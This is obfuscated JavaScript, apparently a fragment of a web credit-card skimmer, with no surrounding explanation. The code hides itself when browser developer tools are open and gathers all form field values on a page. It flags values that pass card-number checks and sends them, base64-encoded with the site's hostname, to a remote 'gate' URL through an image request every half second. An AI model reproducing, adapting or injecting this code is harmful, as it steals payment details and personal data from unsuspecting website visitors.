_0x48ecc5=_0x51f6f8?_0x2ae8('0x9'):_0x2ae8('0xa');if(!(_0xe52d47&&_0x51f6f8)&&(window[_0x2ae8('0xb')]&&window[_0x2ae8('0xb')]['\x63\x68\x72\x6f\x6d\x65']&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x2ae8('0xc')][_0x2ae8('0xd')]||_0x51f6f8||_0xe52d47)){if(!_0x5eec53[_0x2ae8('0x2')]||_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x48ecc5){_0x2be177(!![],_0x48ecc5);}_0x5eec53['\x69\x73\x4f\x70\x65\x6e']=!![];_0x5eec53[_0x2ae8('0x3')]=_0x48ecc5;}else{if(_0x5eec53[_0x2ae8('0x2')]){_0x2be177(![],undefined);}_0x5eec53[_0x2ae8('0x2')]=![];_0x5eec53['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0x2ae8('0xe')&&module[_0x2ae8('0xf')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x5eec53;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x5eec53;}}());String[_0x2ae8('0x10')][_0x2ae8('0x11')]=function(){var _0x5ad5ec=0x0,_0x551561,_0x596a74;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x5ad5ec;for(_0x551561=0x0;_0x551561<this[_0x2ae8('0x12')];_0x551561++){_0x596a74=this[_0x2ae8('0x13')](_0x551561);_0x5ad5ec=(_0x5ad5ec<<0x5)-_0x5ad5ec+_0x596a74;_0x5ad5ec|=0x0;}return _0x5ad5ec;};var _0xf50f25={};_0xf50f25[_0x2ae8('0x14')]=_0x2ae8('0x15');_0xf50f25[_0x2ae8('0x16')]={};_0xf50f25[_0x2ae8('0x17')]=[];_0xf50f25[_0x2ae8('0x18')]=![];_0xf50f25[_0x2ae8('0x19')]=function(_0x4ec084){if(_0x4ec084.id!==undefined&&_0x4ec084.id!=''&&_0x4ec084.id!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.id]=_0x4ec084.value;return;}if(_0x4ec084.name!==undefined&&_0x4ec084.name!=''&&_0x4ec084.name!==null&&_0x4ec084.value.length<0x100&&_0x4ec084.value.length>0x0){if(_0x1d6b25(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20',''))&&_0x21a346(_0x3d4a58(_0x3d4a58(_0x4ec084.value,'\x2d',''),'\x20','')))_0xf50f25.IsValid=!![];_0xf50f25.Data[_0x4ec084.name]=_0x4ec084.value;return;}};_0xf50f25[_0x2ae8('0x1a')]=function(){var _0x492257=document.getElementsByTagName(_0x2ae8('0x1b'));var _0x3114b4=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x46a462=document.getElementsByTagName(_0x2ae8('0x1c'));for(var _0x568e29=0x0;_0x568e29<_0x492257.length;_0x568e29++)_0xf50f25.SaveParam(_0x492257[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x3114b4.length;_0x568e29++)_0xf50f25.SaveParam(_0x3114b4[_0x568e29]);for(var _0x568e29=0x0;_0x568e29<_0x46a462.length;_0x568e29++)_0xf50f25.SaveParam(_0x46a462[_0x568e29]);};_0xf50f25[_0x2ae8('0x1d')]=function(){if(!window.devtools.isOpen&&_0xf50f25.IsValid){_0xf50f25.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x36838b=encodeURIComponent(window.btoa(JSON.stringify(_0xf50f25.Data)));var _0x13f71b=_0x36838b.hashCode();for(var _0xfbdf71=0x0;_0xfbdf71<_0xf50f25.Sent.length;_0xfbdf71++)if(_0xf50f25.Sent[_0xfbdf71]==_0x13f71b)return;_0xf50f25.LoadImage(_0x36838b);}};_0xf50f25[_0x2ae8('0x1e')]=function(){_0xf50f25.SaveAllFields();_0xf50f25.SendData();};_0xf50f25[_0x2ae8('0x1f')]=function(_0x21a42e){_0xf50f25.Sent.push(_0x21a42e.hashCode());var _0x528ea8=document.createElement(_0x2ae8('0x20'));_0x528ea8.src=_0xf50f25.GetImageUrl(_0x21a42e);};_0xf50f25[_0x2ae8('0x21')]=function(_0x3c80b7){return _0xf50f25.Gate+_0x2ae8('0x22')+_0x3c80b7;};document[_0x2ae8('0x23')]=function(){if(document[_0x2ae8('0x24')]===_0x2ae8('0x25')){window['\x73\x65\x74\x49\x6e\x74\x65\x72\x76\x61\x6c'](_0xf50f25[_0x2ae8('0x1e')],0x1f4);}};